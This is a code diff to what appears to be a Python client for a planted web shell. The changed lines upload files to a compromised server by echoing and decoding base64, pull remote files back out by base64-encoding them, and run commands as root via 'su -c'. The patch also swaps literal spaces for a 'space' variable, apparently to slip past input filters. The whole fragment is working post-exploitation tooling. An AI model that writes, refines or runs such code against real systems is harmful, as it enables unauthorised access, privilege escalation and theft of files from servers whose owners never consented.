@@ -120,12 +120,14 @@ try:
                else:
                   localfile = command.split()[1]
                   remotefile = command.split()[2]
-                  remotefiletmp = remotefile.rstrip() + ".tmp"
+                  if remotefile == ".":
+                     remotefile = localfile
                   if not slash in remotefile:
-                     if remotefile == ".":
+                     if remotefile == localfile:
                         remotefile = path.rstrip() + slash + command.split()[1]
                      else:
                          remotefile = path.rstrip() + slash + command.split()[2]
+                  remotefiletmp = remotefile.rstrip() + ".tmp"
                   if not slash in localfile:
                      cwd = os.getcwd()
                   try:
@@ -133,11 +135,12 @@ try:
                   except OSError:
                      print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                      continue
-                  print (colored("[+] Uploading file "+ cwd + slash + localfile +" on "+ remotefile +"..\n", "red"))
-                  upload = send_command(PIPE + "echo " + str(base64data.rstrip(), "utf8") + " > " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                  print (colored("[+] Uploading file "+ cwd + slash + localfile + " on " + remotefile + "..\n", "red"))
+                  upload = send_command(PIPE + "echo" + space + str(base64data.rstrip(), "utf8") + space +
+                  ">" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   if system == "linux":
-                     send_command(PIPE + "base64 -di " + remotefile + " > " + remotefiletmp + " ; mv " + remotefiletmp + space +
-                     remotefile, WEBSHELL, HTTP_METHOD, PARAM)
+                     send_command(PIPE + "base64" + space + "-di" + space + remotefile + space + ">" + space + remotefiletmp + space +
+                     ";rm" + space + "-f" + space + remotefile + ";mv" + space + remotefiletmp + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   if system == "windows":
                      command = " ; [System.Convert]::FromBase64String($base64) | Set-Content -Encoding Byte "
                      send_command(PIPE + "$base64 = cat -Encoding UTF8 " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
@@ -158,7 +161,7 @@ try:
                      if slash in localfile:
                         print (colored("[+] Downloading file "+ remotefile +" on "+ localfile +"..\n", "red"))
                      if system == "linux":
-                        base64data = send_command(PIPE + "base64 " + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
+                        base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
                      if system == "windows":
                          command = "[Convert]::ToBase64String([IO.File]::ReadAllBytes('"+remotefile+"'))" 
                          base64data = send_command(PIPE + command, WEBSHELL, HTTP_METHOD, PARAM)
@@ -219,7 +222,7 @@ try:
                               print (colored(content, "yellow"))  
                            else:
                               if args.sudo:
-                                 content = send_command(PIPE + "su -c " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                                 content = send_command(PIPE + "su" + space + "-c" + space + command, WEBSHELL, HTTP_METHOD, PARAM)
                                  if "<pre>" in content:
                                      content = str(content).split("<pre>", 1)[1] ; content = str(content).split("</pre>", 1)[0]
                                      content = remove_html(content) + "\n"
